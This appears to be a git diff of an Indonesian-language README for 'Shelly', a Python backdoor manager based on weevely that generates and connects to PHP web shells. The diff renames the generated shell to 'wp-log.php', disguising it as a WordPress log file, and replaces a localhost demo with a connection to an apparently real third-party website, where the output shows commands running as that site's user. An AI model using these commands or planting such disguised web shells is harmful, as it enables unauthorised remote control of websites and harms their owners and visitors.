@@ -1,7 +1,7 @@
 
 ## Shelly | Simple Backdoor Manager with Python (based on weevely)
 
-![Screenshoot](/shelly.png)
+![Screenshoot](capture/capture-2.png)
 <br>
 Shelly adalah sebuah tool sederhana yang ditulis menggunakan Python, yang berfungsi untuk meremote sebuah website
 <br>
@@ -20,7 +20,7 @@ sudo pip install -r requirements.txt
 ### Example :
 <pre>
 
-python3 shell.py -g backdoor -p tegal1337
+python3 shell.py -g wp-log -p tegal1337
    ______      ____
   / __/ / ___ / / __ __
  _\ \/ _ / -_/ / / // /
@@ -33,14 +33,20 @@ Generate :
 Connect Server :
 [+] ./backdoor.py -u "url_shell" -p "password"
 
-Backdoor berhasil dibuat dengan nama backdoor.php dan password tegal1337
+Backdoor berhasil dibuat dengan nama wp-log.php dan password tegal1337
 
-dalpan@Tegal1337:~/Tools$ mv backdoor.php /opt/lampp/htdocs/php-futsal/
-dalpan@Tegal1337:~/Tools$ python3 shell.py -u "http://localhost/php-futsal/backdoor.php" -p tegal1337
+dalpan@Tegal1337:~/Tools$ python3 shell.py -u "https://www.pamz3d.com/wp-log.php" -p tegal1337
 /opt/lampp/htdocs/php-futsal$ id
-uid=1(daemon) gid=1(daemon) groups=1(daemon)
+uid=501(pamz3d) gid=501(pamz3d) groups=501(pamz3d)
 </pre>
-![Screenshoot](/shelly2.png)
+![Screenshoot](capture/capture.png)
+![Screenshoot](capture/capture-3.png)
+
+### Artikel :
+<ul>
+   <li>https://www.tegal-1337.com/2020/01/meremote-sebuah-website-menggunakan.html</li>
+</ul>
+
 ### Contact :
 <ul>
   <li> Email : contact@dalpan.co</li>
